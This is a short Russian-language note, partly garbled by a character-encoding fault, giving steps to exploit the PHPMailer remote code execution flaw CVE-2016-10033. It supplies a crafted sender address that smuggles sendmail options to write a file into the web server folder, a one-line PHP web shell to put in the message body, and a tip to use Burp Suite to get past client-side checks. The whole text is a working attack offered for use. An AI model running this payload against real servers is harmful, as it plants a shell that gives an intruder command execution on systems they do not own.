CVE-2016-10033: PHPMailer RCE

Ќеобходимо в строку адреса добавить свои параметры, которые создадут файл в
папке веб-сервера с содержимым php-shell, возможно понадобитс€ burp suite дл€
обхода защиты со стороны клиента.

Ёто добавл€ем в адресс отправлени€ письма:

"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1

Ёто добавл€ем в тело письма:

<?php system($_GET['c']);?>